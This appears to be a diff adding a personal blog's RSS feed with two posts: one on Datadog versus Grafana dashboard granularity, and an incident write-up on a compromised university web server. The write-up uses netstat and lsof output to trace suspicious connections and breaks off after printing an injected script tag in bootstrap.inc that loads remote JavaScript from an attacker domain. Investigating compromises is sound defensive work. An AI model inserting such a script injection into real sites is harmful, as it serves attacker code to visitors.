@@ -1,0 +1,407 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Posts on My Personal Site</title>
+        <link>http://localhost:1313/posts/</link>
+        <description>Recent content in Posts on My Personal Site</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Sat, 04 Jul 2020 12:45:43 -0500</lastBuildDate><atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Datadog vs Grafana Dashboards</title>
+        <link>http://localhost:1313/posts/datadog-grafana/datadog-grafana/</link>
+        <pubDate>Sat, 04 Jul 2020 12:45:43 -0500</pubDate>
+        
+        <guid>http://localhost:1313/posts/datadog-grafana/datadog-grafana/</guid>
+        <description>&lt;img src="http://localhost:1313/cover.jpg" alt="Featured image of post Datadog vs Grafana Dashboards" /&gt;&lt;p&gt;When comparing dashboards between Datadog and Grafana, we often find discrepancies between them. Even though both Datadog and Grafana scrape metrics from the same source, we see vastly differing visualizations and we often wonder which has a better accuracy compared to the source of truth. In this blog post, we investigate the discrepancies between Grafana and DataDog dashboards and how we can resolve/understand them. We begin by giving a brief overview on the data (or metrics) being collected.&lt;/p&gt;
+&lt;h3 id=&#34;openmetrics&#34;&gt;Openmetrics
+&lt;/h3&gt;&lt;p&gt;Openmetrics is the standard for collecting metrics. It supports text format representation that allows applications and infrastructure resources to post text-based metrics on an endpoint (eg. https://xxx:8080/metrics) and allow agents to scrape (collect) metrics from that webpage. An example of the text-format metrics is shown &lt;a class=&#34;link&#34; href=&#34;https://prometheus.io/docs/instrumenting/exposition_formats/#text-based-format&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}.&lt;/p&gt;
+&lt;p&gt;We follow this methodology and allow Prometheus and Datadog agents to scrape metrics. Here is an &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/assets/files/am_curl_output.txt&#34; &gt;example&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}.&lt;/p&gt;
+&lt;p&gt;For the focus of this document, you can safely ignore the &lt;code&gt;process_*&lt;/code&gt; metrics and comments (lines that start with &lt;code&gt;#&lt;/code&gt;) from the file above.&lt;/p&gt;
+&lt;p&gt;From viewing the metrics, we notice two types:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Summaries (metrics that end in &lt;code&gt;_sum&lt;/code&gt; and &lt;code&gt;_count&lt;/code&gt;)&lt;/li&gt;
+&lt;li&gt;Histograms (metrics that end in &lt;code&gt;_bucket&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;summaries&#34;&gt;Summaries
+&lt;/h3&gt;&lt;p&gt;Based on the description of a &lt;a class=&#34;link&#34; href=&#34;https://prometheus.io/docs/concepts/metric_types/#summary&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;summary&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;- the **total sum** of all observed values, exposed as `&amp;lt;basename&amp;gt;_sum`
+- the **count** of events that have been observed, exposed as `&amp;lt;basename&amp;gt;_count`
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Note that they are counters and so they are always increasing. For more reference, please visit &lt;a class=&#34;link&#34; href=&#34;https://prometheus.io/docs/practices/histograms/#count-and-sum-of-observations&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}.&lt;/p&gt;
+&lt;p&gt;For the usecase going forward for summaries, we&amp;rsquo;ll use &lt;strong&gt;am_request_count&lt;/strong&gt; metric as example.&lt;/p&gt;
+&lt;h4 id=&#34;grafana-dashboard-for-request-count-for-healthz-endpoint&#34;&gt;Grafana Dashboard for Request Count for /healthz endpoint
+&lt;/h4&gt;&lt;p&gt;The graph shown below is for the &lt;strong&gt;Last 15 minutes&lt;/strong&gt; of the &lt;strong&gt;Request Count&lt;/strong&gt; for &lt;strong&gt;/healthz&lt;/strong&gt; endpoint. As you can see, the value is almost-flat at &lt;strong&gt;55&lt;/strong&gt; - &lt;strong&gt;56&lt;/strong&gt; req/sec.  An important note about a Grafana dashboard is that the smallest granularity (or shortest interval) between data points is &lt;strong&gt;30&lt;/strong&gt; seconds if the time period (highlighted in yellow box on the first screenshot below) is small enough from  &lt;strong&gt;Last 5 mins&lt;/strong&gt; till &lt;strong&gt;Last 3 hours&lt;/strong&gt;. After that, it becomes 1 min, 2min, 4min etc. for longer time periods (&lt;strong&gt;Last 6 hours, Last 12 hours,&amp;hellip;&lt;/strong&gt;).&lt;/p&gt;
+&lt;p&gt;As shown on the &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/assets/img/grafanaGraph.png&#34; &gt;here&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;} (highlighted in red box), the Prometheus query is: &lt;code&gt;am_request_count:sum(endpoint=~&amp;quot;$endpoint&amp;quot;)&lt;/code&gt;. From looking at the &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/assets/img/prometheusGraph.png&#34; &gt;Prometheus dashboard&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}, we can confirm the value stays within 55-56.&lt;/p&gt;
+&lt;h4 id=&#34;datadog-dashboard-for-request-count-for-healthz-endpoint&#34;&gt;DataDog Dashboard for Request Count for /healthz endpoint
+&lt;/h4&gt;&lt;p&gt;Now we replicate the same Grafana dashboard on &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/assets/img/DDGraph.png&#34; &gt;DataDog&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}. As you can see, the values are widely different (values fluctuate around 25-30). Why?&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Main cause of discrepancy: Data interval granularity&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Datadog&amp;rsquo;s granularity is &lt;strong&gt;5 secs&lt;/strong&gt; (as opposed to &lt;strong&gt;30 secs&lt;/strong&gt; in Grafana) for the &lt;strong&gt;Past 15 Minutes&lt;/strong&gt;. Also, Datadog&amp;rsquo;s interval increases as the time period widens (same as Grafana). The main reason is that Datadog has a restriction of maximum 300 datapoints in the graph (regardless of the time period). Thus, as the time frame widens, each data point will represent more and more of an aggregated value (and vice versa if time period is shortened).&lt;/p&gt;
+&lt;p&gt;Therefore, not much aggregation happens for &lt;strong&gt;Past 15 minutes&lt;/strong&gt; time period in DataDog. Now, if we aggregate to 30 secs, the graph look similar to Grafana as shown &lt;a class=&#34;link&#34; href=&#34;http://localhost:1313/assets/img/grafanaAggGraph.png&#34; &gt;here&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}.&lt;/p&gt;
+&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion
+&lt;/h3&gt;&lt;p&gt;Grafana does a lot of aggregation compared to Datadog. For more information regarding data aggregation in DataDog, please refer &lt;a class=&#34;link&#34; href=&#34;https://docs.datadoghq.com/dashboards/querying/#rollup-to-aggregate-over-time&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;here&lt;/a&gt;{:target=&amp;quot;_blank&amp;quot;}.&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>Uncovering Cryptojacking/Phishing At University of Toronto</title>
+        <link>http://localhost:1313/posts/cryptojacking-phishing-savi/cryptojacking-phishing-savi/</link>
+        <pubDate>Sat, 06 Jun 2020 17:50:51 -0500</pubDate>
+        
+        <guid>http://localhost:1313/posts/cryptojacking-phishing-savi/cryptojacking-phishing-savi/</guid>
+        <description>&lt;img src="http://localhost:1313/cover.jpg" alt="Featured image of post Uncovering Cryptojacking/Phishing At University of Toronto" /&gt;&lt;p&gt;During my Masters work at U oF T, I supported the operations of an OpenStack-based Cloud infrastructure (SAVI) and make sure it&amp;rsquo;s up and running. One of the interesting things I worked on was the security aspects of the platform; mainly playing with installing Fail2ban, OSSEC and investigating security threats/issues on the platform. There was one instance we got an alert from the main U of T Security team that there was a backdoor Command-and-Control traffic running on a VM that was on our platform. The VM was hosting a Wordpress-based web-server. This blog is about how we investigated this issue on our platform.&lt;/p&gt;
+&lt;p&gt;Note that for privacy concerns, we removed the actual website domain and replaced the public IP addresses as private addresses.
+We begin by logging into the machine and begin our analysis with some understanding of the network connections.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:~$ sudo netstat -an
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Active Internet connections (servers and established)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Proto Recv-Q Send-Q Local Address           Foreign Address         State
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:38252   204.188.217.106:80      ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:22      10.10.10.12:58172       ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp        0      0 10.10.10.10:55387   204.188.217.106:80      ESTABLISHED
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::80                   :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::22                   :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::25                   :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;tcp6       0      0 :::443                  :::*                    LISTEN
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 10.10.10.10:123     0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 127.0.0.1:123           0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 0.0.0.0:123             0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 0.0.0.0:59028           0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 127.0.0.1:18120         0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 0.0.0.0:1812            0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 0.0.0.0:1813            0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 0.0.0.0:1814            0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp        0      0 0.0.0.0:51414           0.0.0.0:*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp6       0      0 fe80::219:b9ff:fe2c:123 :::*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp6       0      0 ::1:123                 :::*
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;udp6       0      0 :::123                  :::*
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Based on the &lt;strong&gt;netstat connections&lt;/strong&gt;, we realize a few &lt;em&gt;&lt;code&gt;tcp&lt;/code&gt;&lt;/em&gt; connections using the port &lt;em&gt;80&lt;/em&gt;. Thus, we try to find the processes using these connections:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:~$ sudo lsof -i tcp:80 -P -R
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;COMMAND     PID  PPID     USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545     1 www-data    3u  IPv4 22142705      0t0  TCP website.ca:55464-&amp;gt;204.188.217.106:80 (ESTABLISHED)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26550     1 www-data    3u  IPv4 22105560      0t0  TCP website.ca:38252-&amp;gt;204.188.217.106:80 (ESTABLISHED)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   27805     1     root    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   27993 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   28066 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   28067 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   28447 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   28449 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   29256 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   29262 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   29373 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   29375 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;apache2   29436 27805 www-data    4u  IPv6 10024448      0t0  TCP *:80 (LISTEN)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We realize that there are connections to some other IP address with port &lt;em&gt;80&lt;/em&gt;, so we take a deeper dive on the process &lt;strong&gt;26545&lt;/strong&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:~$ sudo lsof -p 26545
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;COMMAND     PID     USER   FD   TYPE             DEVICE SIZE/OFF     NODE NAME
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  cwd    DIR              252,0    69632  3538945 /tmp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  rtd    DIR              252,0     4096        2 /
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  txt    REG              252,0    10416  3017043 /usr/bin/perl
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0    43416  4981915 /usr/lib/perl/5.18.2/auto/Socket/Socket.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0    18728  4981918 /usr/lib/perl/5.18.2/auto/IO/IO.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0    43368  6946983 /lib/x86_64-linux-gnu/libcrypt-2.19.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0   141574  6947044 /lib/x86_64-linux-gnu/libpthread-2.19.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0  1071552  6946910 /lib/x86_64-linux-gnu/libm-2.19.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0    14664  6946980 /lib/x86_64-linux-gnu/libdl-2.19.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0  1840928  6947193 /lib/x86_64-linux-gnu/libc-2.19.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0  1608280  3017046 /usr/lib/libperl.so.5.18.2
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data  mem    REG              252,0   149120  6947052 /lib/x86_64-linux-gnu/ld-2.19.so
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data    0r   CHR                1,3      0t0     6368 /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data    1w  FIFO                0,8      0t0 22105555 pipe
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data    2w   REG              252,0    14135 10751213 /var/log/apache2/error.log
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data    3u  IPv4           22143052      0t0      TCP website.ca:55789-&amp;gt;204.188.217.106:http (ESTABLISHED)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/usr/sbin 26545 www-data    6u  unix 0xffff88022e742c00      0t0 22105553 socket
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Seems like there are perl processes running and also some access to &lt;code&gt;/var/log/apache2/error.log&lt;/code&gt;. Also, the IP address &lt;code&gt;204.188.217.106&lt;/code&gt; keeps recurring. Since we know it&amp;rsquo;s somehow related to the webserver, we check the &lt;code&gt;/var/www&lt;/code&gt; directory to check for any activity by the user &lt;code&gt;www-data&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:/var/www$ ls -la
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total 56
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x 13 root     root     4096 Sep 10 22:37 .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x 13 root     root     4096 Feb 28  2017 ..
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  5 root     root     4096 Oct  3  2016 alg.old
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  8 root     root     4096 Aug 23  2013 corporateclean
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  2 root     root     4096 Jul 17  2012 demo
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  2 root     root     4096 Feb  1  2017 html
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x 11 www-data www-data 4096 Sep  3 23:52 subdomain
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  5 root     root     4096 Nov 29  2017 nal
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  2 root     root     4096 Mar  3  2015 phpmyadmin
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxrwxr-x  6 www-data www-data 4096 Feb  5  2018 site
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  8 root     root     4096 Feb 28  2017 site-wp-3.3
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  6 stack    stack    4096 Feb 28  2017 site-wp-3.5
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  6 stack    stack    4096 Feb 28  2017 site-wp-3.7
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 root     root       21 May  4  2012 test.php
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;By the looks of the output, there could be two folders: &lt;code&gt;subdomain&lt;/code&gt; and &lt;code&gt;site&lt;/code&gt;. Since &lt;code&gt;subdomain&lt;/code&gt; is the most recent updated folder, we take a deeper dive on the &lt;code&gt;includes/&lt;/code&gt; subfolder:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-console&#34; data-lang=&#34;console&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@host:/var/www/subdomain$ ls -la --full-time includes/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;total 1804
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x  4 www-data www-data   4096 2017-05-25 21:38:11.742771907 -0400 .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;drwxr-xr-x 11 www-data www-data   4096 2018-09-03 23:52:29.924296116 -0400 ..
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data  13816 2017-05-25 17:54:24.388035506 -0400 actions.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data  46913 2017-05-25 17:54:24.388035506 -0400 ajax.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data   1701 2017-05-25 17:54:24.388035506 -0400 archiver.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data  13664 2017-05-25 17:54:24.384035450 -0400 authorize.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data  17497 2017-05-25 17:54:24.388035506 -0400 batch.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data   2310 2017-05-25 17:54:24.380035393 -0400 batch.queue.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data  19998 2017-05-25 17:54:24.384035450 -0400 cache.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data   2487 2017-05-25 17:54:24.384035450 -0400 cache-install.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-rw-r--r--  1 www-data www-data 302278 2017-05-25 17:54:24.384035450 -0400 common.inc
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;...
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There&amp;rsquo;s one particulr line that looks very suspicious (because of the last updated timetstamp and the size is larger than the others:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;-rw-r--r--  1 www-data www-data 118488 2018-08-27 06:20:36.531461159 -0400 bootstrap.inc&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;While sifting through the file, near the end we found this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;?&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;text/javascript&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;src&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;//upgraderservices.cf/drupal.js&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;script&lt;/span&gt;&amp;gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;?php^M
